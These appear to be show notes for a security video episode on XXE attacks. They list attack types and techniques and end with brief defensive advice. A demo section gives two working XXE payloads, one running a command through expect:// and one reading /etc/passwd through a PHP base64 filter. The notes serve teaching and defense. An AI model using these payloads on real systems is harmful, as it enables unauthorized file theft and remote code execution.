Dissecting XXE Attacks - Tradecraft Security Weekly - Episode # 19

https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet
# Threat Surface
- XML is everywhere
- Object serialization
- Pre-authentication
- Pre-processing
- Hard to detect
- Beware of defaults
# Attack Overview
- Occurs in the XML parser
- May be blind
- Remote code execution
- Steal local files
- SSRF
- Denial of Service
# Advanced Techniques
- Rmeote DTD for exfil
- XXE databases directly
- Encode bypass w/ CDATA
- Base64/Compress w/ PHP
- ldap:// jar:// expect:// etc...
# XXE to RCE DEMO
- intercept request in burp
```
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root
[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=expect://ls">
]>
<root>
	<name></name>
	<tel></tel>
	<email>&xxe;</email>
	<password></password>
</root>
```
```
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root
[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>
	<name></name>
	<tel></tel>
	<email>&xxe;</email>
	<password></password>
</root>
```
# For the Blue Team
- Know your parser
- Disable external entities
- Whitelist egress filtering on server



















